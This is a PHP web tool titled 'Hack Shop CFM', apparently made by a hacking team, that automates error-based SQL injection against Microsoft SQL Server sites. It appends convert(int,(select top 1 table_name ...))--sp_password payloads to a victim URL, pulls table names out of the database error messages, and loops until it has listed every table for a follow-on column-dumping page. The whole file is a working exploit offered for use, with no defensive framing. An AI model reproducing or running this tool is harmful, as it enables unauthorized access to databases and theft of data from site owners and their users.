<?php
ini_set ("max_execution_time","360000");
function convert($chuoi)
{
	$temp="char(";
	for ($i=0;$i<strlen($chuoi)-1;$i++)
	{
		$temp.=ord($chuoi[$i]).")%2bchar(";
	}
	$temp.=ord($chuoi[strlen($chuoi)-1]).")";
	return $temp;
}
class CURL 
{
	var $callback = false;
	function setCallback($func_name) 
	{
		$this->callback = $func_name;
	}
	function doRequest($method, $url, $vars) 
	{
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		if ($method == 'POST') 
		{
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
		}
		$data = curl_exec($ch);
		curl_close($ch);
		if ($data) 
		{
			if ($this->callback)
			{
				$callback = $this->callback;
				$this->callback = false;
				return call_user_func($callback, $data);
			} 
			else 
			{
			return $data;
			}
		} 
		else
		{
		return curl_error($ch);
		}
	}
	function get($url) 
	{
		return $this->doRequest('GET', $url, 'NULL');
	}
	function post($url, $vars) 
	{
		return $this->doRequest('POST', $url, $vars);
	}
}
?>
<html><head><title>Getting tables ...</title><meta http-equiv="Content-Type" content="text/html; charset=uft-8">
<style type="text/css">
body
{
	background-color: rgb(74,81,85);
}
body,td,th {
	color: #99CC00;
}
h2
{
	color: #FFCC00;
}
.style1 {font-weight: bold}
</style></head>
<body>
 <table width="80%" align="center" border="0">
    <tbody><tr>
	<td align="center">
<h1>Hack Shop CFM</h1><font size="5" color="yellow">*=-.| [-A.M.I - V.H.C-] |.-=*</font>
<br /><br />
<form target="main" action="column.php" method="POST">
<div align="center">
<hr border="1">
<?php
$cc = new CURL();
$url_ori=$_POST["link"];
$url=$url_ori."convert(int,(select%20top%201%20table_name%20from%20information_schema.tables))--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$first_table=$out[1];
echo "<input type=hidden name=link value=".$url_ori.">";
echo "<select name=\"table\" size=30 style=\"width:800px\">";
echo "<option value=".$first_table.">".$first_table."</option>";
$first_table=convert($first_table);
$url=$url_ori."convert(int,(select%20top%201%20table_name%20from%20information_schema.tables%20where%20table_name%20not%20in%20(".$first_table.")))--sp_password";
$dat = $cc->get("$url");
@eregi ("value '(.*)' to",$dat,$out);
$xploited_table=$out[1];
echo "<option value=".$xploited_table.">".$xploited_table."</option>";
$xploited_table=convert($xploited_table);
$stop=false;
$url_new=$url_ori."convert(int,(select%20top%201%20table_name%20from%20information_schema.tables%20where%20table_name%20not%20in%20(".$first_table;
while(!$stop)
{
	$url_new.=",".$xploited_table;
	$url=$url_new.")))--sp_password";
	$dat = $cc->get("$url");
	@eregi ("value '(.*)' to",$dat,$out);

	$xploited_table=$out[1];
	echo "<option value=".$xploited_table.">".$xploited_table."</option>";

	$xploited_table=convert($xploited_table);
	$url_check=$url_new.",".$xploited_table.")))--sp_password";
	$dat = $cc->get("$url_check");
	@eregi ("value '(.*)' to",$dat,$out);
	$check=$out[1];
	if (convert($check)==$xploited_table)
	{
		$stop=true;
	}
}
?>
</select><br>
<br><input type="submit" value="Get columns">

</div><hr border="1"><div align="center">
 <p>

   <font color="#FFFF00" size="5"><b>...:: Code By MrAmiVn ::...</b></font>
 </p>
 <strong>Contact Y!M ami_vhc<br />
 =================================== <font color="red">VHC-Team </font>===================================</strong><br>


</div>
</td></tr></tbody></table>
</body>
</html>

